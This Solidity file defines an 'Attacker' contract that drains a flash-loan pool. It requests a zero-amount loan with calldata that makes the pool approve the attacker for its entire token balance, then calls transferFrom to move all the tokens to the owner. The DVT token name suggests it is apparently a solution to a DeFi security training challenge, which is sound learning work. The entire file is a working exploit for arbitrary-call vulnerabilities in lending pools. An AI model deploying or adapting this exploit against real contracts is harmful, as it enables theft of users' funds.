// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IFlashLoan {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

interface IERC {
    function balanceOf(address borrower) external view returns (uint256);

    function transferFrom(address who, address spender, uint amount) external;
}

contract Attacker {
    IFlashLoan victimContract;
    IERC DVTToken;
    address owner;

    constructor(address _victimCotract, address token) {
        victimContract = IFlashLoan(_victimCotract);
        DVTToken = IERC(token);
        owner = msg.sender;
    }

    function attackFlashloan() public {
        uint PoolBalance = DVTToken.balanceOf(address(victimContract));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            PoolBalance
        );
        victimContract.flashLoan(0, owner, address(DVTToken), data);

        DVTToken.transferFrom(address(victimContract), owner, PoolBalance);
    }

    fallback() external {}
}
